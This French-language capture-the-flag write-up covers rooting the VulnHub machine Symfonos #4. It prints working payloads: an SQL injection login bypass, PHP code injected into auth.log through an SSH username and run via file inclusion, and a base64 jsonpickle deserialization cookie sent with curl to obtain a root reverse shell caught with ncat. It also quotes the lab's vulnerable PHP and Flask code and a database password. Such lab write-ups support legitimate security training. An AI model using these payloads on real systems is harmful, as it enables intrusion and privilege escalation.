# Solution du CTF Symfonos #4 de VulnHub

Jamais 3 sans 4 avec [cet autre CTF](https://vulnhub.com/entry/symfonos-4,347/).

```
Nmap scan report for 192.168.56.115
Host is up (0.00023s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
| ssh-hostkey: 
|   2048 f9c17395a417dff6ed5c8e8ac805f98f (RSA)
|   256 bec1fdf13364399a683564f9bd27ec01 (ECDSA)
|_  256 66f76ae8edd51d2d36326439384f9c8a (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
```

Comme pour le précédent il faut énumérer un moment le serveur web avant de trouver quelque chose d'intéressant.

Un premier lieu je trouve un dossier `/gods` contenant trois fichiers à l'extension `.log` nommés après les dieux `hades`, `poseidon` et `zeus`.

Dans un second temps je trouve un fichier `sea.php` qui redirige vers une mire de login `atlantis.php`.

La mire de login en question est bypassable car on parvient à une zone authentifiée si on saisit le nom d'utilisateur `' OR '1'=1`.

On a alors un champ `select` dont les valeurs correspondent aux noms de dieux précédents et la sélection de l'une des entrées affiche le fichier de log correspondant. On est donc sur une faille de directory traversal ou même d'inclusion PHP.

Le script ajoute donc de lui même le préfixe `.log` qui ne semble pas bypassable avec un null byte (`%00` à l'ancienne) et l'inclusion distante n'est pas activée (donc on ne peut pas passer un préfixe `http://` ou ftp://).

## I am payload

Aïe, aïe, aïe il semble qu'on est condamné à inclure un fichier avec l'extension `.log`. Heureusement l'auteur du CTF a pensé à nous car `/var/log/auth.log` est accessible :

http://192.168.56.115/sea.php?file=../../../../var/log/auth

Pour injecter notre code PHP dans ce fichier de log on va se connecter via SSH avec un compte invalide :

```bash
ssh -l '<?php system($_GET[chr(99)]); ?>' 192.168.56.115
```

On peut désormais exécuter des commandes de cett façon :

http://192.168.56.115/sea.php?file=../../../../var/log/auth&c=whoami

Une fois un shell plus évolué obtenu je vais chercher le code PHP du formulaire de connexion :

```php
<?php
   define('DB_USERNAME', 'root');
   define('DB_PASSWORD', 'yVzyRGw3cG2Uyt2r');
   $db = new PDO("mysql:host=localhost:3306;dbname=db", DB_USERNAME,DB_PASSWORD);

   session_start();

   if($_SERVER["REQUEST_METHOD"] == "POST") {
   $username = $_POST["username"];
   $pwd = hash('sha256',$_POST["password"]);
   //if (!$db) die ($error);
   $statement = $db->prepare("Select * from users where username='".$username."' and pwd='".$pwd."'");
   $statement->execute();
   $results = $statement->fetch(PDO::FETCH_ASSOC);
   if (isset($results["pwd"])){
       $_SESSION['logged_in'] = $username;
       header("Location: sea.php");
   } else {
        $_SESSION["logged_in"] = false;
        sleep(2); // Don't brute force :(
        echo "<br /><center>Incorrect login</center>";
   } }
?>
```

C'est la bonne pioche car le mot de passe root du mysql permet de se connecter au compte local `poseidon`.

En cherchant les dossiers écrivables pour cet utilisateur je remarque un dossier inhabituel :

```shellsession
poseidon@symfonos4:~$ find / -type d -writable 2> /dev/null | grep -v /proc | grep -v /sys
/run/user/1000
/run/user/1000/gnupg
/run/lock
/home/poseidon
/home/poseidon/.gnupg
/home/poseidon/.gnupg/private-keys-v1.d
/opt/code
/var/lib/php/sessions
/var/tmp
/dev/mqueue
/dev/shm
/tmp
poseidon@symfonos4:~$ ls -al /opt/code/
total 28
drwxr-xrwx 4 root root 4096 Aug 19  2019 .
drwxr-xr-x 3 root root 4096 Aug 18  2019 ..
-rw-r--r-- 1 root root  942 Aug 19  2019 app.py
-rw-r--r-- 1 root root 1536 Aug 19  2019 app.pyc
drwxr-xr-x 4 root root 4096 Aug 19  2019 static
drwxr-xr-x 2 root root 4096 Aug 19  2019 templates
-rw-r--r-- 1 root root  215 Aug 19  2019 wsgi.pyc
poseidon@symfonos4:~$ ss -lntp
State                       Recv-Q                       Send-Q                                             Local Address:Port                                             Peer Address:Port                      
LISTEN                      0                            80                                                     127.0.0.1:3306                                                  0.0.0.0:*                         
LISTEN                      0                            128                                                    127.0.0.1:8080                                                  0.0.0.0:*                         
LISTEN                      0                            128                                                      0.0.0.0:22                                                    0.0.0.0:*                         
LISTEN                      0                            128                                                            *:80                                                          *:*                         
LISTEN                      0                            128                                                         [::]:22                                                       [::]:
```

## Cornichon JSON

On a visiblement une appli Flask qui tourne sur le port 8080 et on a les permissions d'écriture dans le dossier. Voici le code de l'appli :

```python
from flask import Flask, request, render_template, current_app, redirect

import jsonpickle
import base64

app = Flask(__name__)

class User(object):

    def __init__(self, username):
        self.username = username


@app.route('/')
def index():
    if request.cookies.get("username"):
        u = jsonpickle.decode(base64.b64decode(request.cookies.get("username")))
        return render_template("index.html", username=u.username)
    else:
        w = redirect("/whoami")
        response = current_app.make_response(w)
        u = User("Poseidon")
        encoded = base64.b64encode(jsonpickle.encode(u))
        response.set_cookie("username", value=encoded)
        return response


@app.route('/whoami')
def whoami():
    user = jsonpickle.decode(base64.b64decode(request.cookies.get("username")))
    username = user.username
    return render_template("whoami.html", username=username)


if __name__ == '__main__':
    app.run()
```

Ma première logique a été de créé un script `jsonpickle.py` dans le dossier `/opt/code` mais ça ne fonctionnait pas, sans doute car le code est déjà chargé par l'appli (éventuellement avec un reboot ça pourrait fonctionner).

Je me suis penché alors sur le module `jsonpickle`. Le module `pickle` de Python est connu pour être dangereux s'il désérialise des données non sûres, il y a fort à parier que ce soit la même chose pour `jsonpickle`.

Effectivement sur exploit-db je trouve une astuce pour créer un jsonpickle permettant l'exécution de commande : [python jsonpickle 2.0.0 - Remote Code Execution - Multiple remote Exploit](https://www.exploit-db.com/exploits/49585)

Je parviens à obtenir quelque chose de sympathique de cette façon :

```python
>>> jsonpickle.decode('{"1": {"py/repr": "os/os.system(chr(47)+chr(116)+chr(109)+chr(112)+chr(47)+chr(120))"}, "2": {"py/id": "67"}}')
sh: 1: /tmp/x: not found
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/local/lib/python2.7/dist-packages/jsonpickle/unpickler.py", line 41, in decode
    return context.restore(data, reset=reset, classes=classes)
  File "/usr/local/lib/python2.7/dist-packages/jsonpickle/unpickler.py", line 150, in restore
    value = self._restore(obj)
  File "/usr/local/lib/python2.7/dist-packages/jsonpickle/unpickler.py", line 207, in _restore
    return restore(obj)
  File "/usr/local/lib/python2.7/dist-packages/jsonpickle/unpickler.py", line 514, in _restore_dict
    data[k] = self._restore(v)
  File "/usr/local/lib/python2.7/dist-packages/jsonpickle/unpickler.py", line 207, in _restore
    return restore(obj)
  File "/usr/local/lib/python2.7/dist-packages/jsonpickle/unpickler.py", line 288, in _restore_id
    return self._objs[idx]
TypeError: list indices must be integers, not unicode
```

Ici je fais exécuter le fichier `/tmp/x`. J'ai eu à changer ça pour `/dev/shm/x` car l'appli Flask be semblait pas voir mon fichier dans `/tmp` (sans doute la magie noire de `systemd`).

Pour l'exploitation il faut encoder le payload en base64 puis le donner comme cookie à l'endpoint `/whoami` :

```bash
curl -D- http://127.0.0.1:8080/whoami -H "Cookie: username=eyIxIjogeyJweS9yZXByIjogIm9zL29zLnN5c3RlbShjaHIoNDcpK2NocigxMDApK2NocigxMDEpK2NocigxMTgpK2Nocig0NykrY2hyKDExNSkrY2hyKDEwNCkrY2hyKDEwOSkrY2hyKDQ3KStjaHIoMTIwKSkifSwgIjIiOiB7InB5L2lkIjogIjY3In19;"
```

Et kikiçé qui a un beau shell root qui ride de l'hippocampe ? :-D

```shellsession
$ ncat -l -p 7777 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::7777
Ncat: Listening on 0.0.0.0:7777
Ncat: Connection from 192.168.56.115.
Ncat: Connection from 192.168.56.115:34120.
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
ls
proof.txt
cat proof.txt

        Congrats on rooting symfonos:4!
 ~         ~            ~     w   W   w
                    ~          \  |  /       ~
        ~        ~        ~     \.|./    ~
                                  |
                       ~       ~  |           ~
       o        ~   .:.:.:.       | ~
  ~                 wwWWWww      //   ~
            ((c     ))"""((     //|        ~
   o       /\/\((  (( 6 6 ))   // |  ~
          (d d  ((  )))^(((   //  |
     o    /   / c((-(((')))-.//   |     ~
         /===/ `) (( )))(( ,_/    |~
  ~     /o o/  / c((( (()) |      |  ~          ~
     ~  `~`^  / c (((  ))  |      |          ~
             /c  c(((  (   |  ~   |      ~
      ~     /  c  (((  .   |      |   ~           ~
           / c   c ((^^^^^^`\   ~ | ~        ~
          |c  c c  c((^^^ ^^^`\   |
  ~        \ c   c   c(^^^^^^^^`\ |    ~
       ~    `\ c   c  c;`\^^^^^./ |             ~
              `\c c  c  ;/^^^^^/  |  ~
   ~        ~   `\ c  c /^^^^/' ~ |       ~
         ~        `;c   |^^/'     o
             .-.  ,' c c//^\\         ~
     ~      ( @ `.`c  -///^\\\  ~             ~
             \ -` c__/|/     \|
      ~       `---'   '   ~   '          ~
 ~          ~          ~           ~             ~
        Contact me via Twitter @zayotic to give feedback!
```

*Publié le 21 février 2023*
